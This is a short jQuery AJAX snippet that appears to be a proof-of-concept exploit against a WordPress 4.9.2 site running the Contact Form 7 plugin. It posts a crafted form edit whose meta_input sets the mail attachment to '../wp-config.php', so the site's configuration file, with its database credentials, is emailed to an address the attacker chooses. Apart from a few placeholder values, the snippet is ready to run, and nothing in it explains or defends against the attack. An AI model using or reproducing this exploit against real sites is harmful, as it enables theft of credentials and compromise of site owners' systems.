var settings = {
    "async": true,
    "crossDomain": true,
    "url": "http://10.0.0.123/wordpress_v4.9.2/wp-admin/post.php?post=xxx",
    "method": "POST",
    "data": {
        "_wpnonce": "xxx",
        "_wp_http_referer": "%2Fwordpress_v4.9.2%2Fwp-admin%2Fpost-new.php",
        "user_ID": "2",
        "action": "post",
        "originalaction": "editpost",
        "post_author": "2",
        "post_type": "wpcf7_contact_form",
        "original_post_status": "auto-draft",
        "auto_draft": "",
        "post_title": "xxx",
        "content": "test",
        "wp-preview": "",
        "hidden_post_status": "draft",
        "post_status": "draft",
        "hidden_post_password": "",
        "hidden_post_visibility": "public",
        "visibility": "public",
        "post_password": "",
        "mm": "12",
        "jj": "22",
        "_thumbnail_id": "-1",
        "advanced_view": "1",
        "comment_status": "open",
        "ping_status": "open",
        "post_name": "",
        "meta_input[_mail][subject]": "test \"[your-subject]\"",
        "meta_input[_mail][sender]": "2",
        "meta_input[_mail][recipient]": "xxx",
        "meta_input[_mail][body]": "From: [your-name] <[your-email]>\\nSubject: [your-subject]\\n\\nMessage Body:\\n[your-message]\\n\\n-- \\n",
        "meta_input[_mail][additional_headers]": "Reply-To: [your-email]",
        "meta_input[_mail][attachments]": "../wp-config.php",
        "meta_input[_mail][use_html]": "false",
        "meta_input[_mail][exclude_blank]": "false",
        "meta_input[_form]": "<label> Your Name (required)\n    [text* your-name] </label>\n\n<label> Your Email (required)\n    [email* your-email] </label>\n\n<label> Subject\n    [text your-subject] </label>\n\n<label> Your Message\n    [textarea your-message] </label>\n\n[submit \\\"Send\\\"]"
    }
}

jQuery.ajax(settings).done(function (response) {
    console.log(response);
});
